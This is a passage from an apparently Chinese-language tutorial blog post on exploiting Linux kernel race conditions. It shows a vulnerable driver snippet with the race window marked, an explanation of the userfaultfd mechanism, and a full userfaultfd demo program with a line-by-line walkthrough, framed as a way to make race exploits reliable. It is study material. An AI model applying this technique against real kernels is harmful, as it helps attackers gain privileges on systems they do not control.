operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//竞争位置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述思路是直观的。然而，由于链表操作包含多个步骤，最终想要达到以上理想状态是不容易的，需要大量尝试。更糟糕的是，上一节的测试显示，不理想的竞态状态可能会导致内核崩溃。后文将介绍利用Linux userfaultfd机制提高内核竞态条件漏洞利用成功率的方法。通过应用<code>userfaultfd</code>机制，我们能够以较高的成功率来达到所需的竞态条件。</p><h3 id="什么是userfaultfd"><a href="#什么是userfaultfd" class="headerlink" title="什么是userfaultfd"></a>什么是userfaultfd</h3><p>有一种攻击方法利用了一个名为 <code>userfaultfd</code> 的函数，以便利用像这样复杂条件下的冲突，甚至将冲突的成功率提高到 100%。</p><p><code>userfaultfd</code> 是 Linux 内核中的一种特殊机制，允许用户空间程序自行处理页面错误（page fault）。下面是其整个流程：<br><img src="/EXP_FILE/9d1012690d1cceec6690bbacba99ba4f_MD5.jpeg"><br>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域；同时还需要专门启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询，以<strong>发现</strong>缺页异常的产生。</p><ol><li><p>当有一个线程在这块内存区域内<strong>触发</strong>缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常</p></li><li><p>内核会调用 <code>handle_userfault()</code> 交由 userfaultfd 处理</p></li><li><p>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 结构通过该 fd 发送给 monitor 线程</p></li><li><p>monitor 线程调用通过 ioctl 处理缺页异常，有如下宏，每个宏都有对应的结构体来传递数据：</p><ul><li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上</li><li><code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0</li><li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充<br>以UFFDIO_COPY为例：<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</p></li></ol><p>以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机&#x2F;进程的迁移等用途，但是<strong>通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p><h3 id="测试例程"><a href="#测试例程" class="headerlink" title="测试例程"></a>测试例程</h3><p>作者提供的例程如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>  </span>  <span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>dummy_page<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>      dummy_page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                      MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dummy_page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap(dummy)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] fault_handler_thread: waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span>        <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* ページフォルト待機 */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"read(uffd)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">==</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: flag=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: addr=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 要求されたページとして返すデータを設定 */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (2)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>dummy_page<span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_COPY)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">register_uffd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>      <span class="token comment">/* userfaultfdの作成 */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_API)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ページをuserfaultfdに登録 */</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ページフォルトを処理するスレッドを作成 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> fault_handler_thread<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">register_uffd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* スレッド中のputsとfutexでハングするので直接printfで出力しない */</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面我们来看看这是如何进行的：</p><ol><li><p>这里用 mmap 分一个匿名页用作后续被监视的区域</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mmap分配两个匿名页用作后续被监视的区域 </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>负责为监视区域注册userfaultfd，并启动轮询线程fault_handler_thread：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">register_uffd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//启动userfaultfd  </span>  <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>      <span class="token comment">/* 通过 userfaultfd 系统调用注册一个 userfaultfd，其中 O_CLOEXEC 和 O_NONBLOCK 和 open 的 flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 userfault*/</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_API)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 为这块内存区域注册 userfaultfd */</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 启动轮询线程，接下来便是等待缺页异常的过程 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> fault_handler_thread<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>轮询线程uffd moniter，负责检查缺页异常并处理</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//moniter线程  </span>  <span class="token keyword">char</span> <span class="token operator">*</span>dummy_page<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>  <span class="token comment">/*mmap分配一个1k的内存页dummy_page，这个页面用于接受返回的数据。*/</span>  dummy_page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                      MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dummy_page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap(dummy)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*创建poofd并启动poll()进行轮询，监控读事件*/</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] fault_handler_thread: waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span 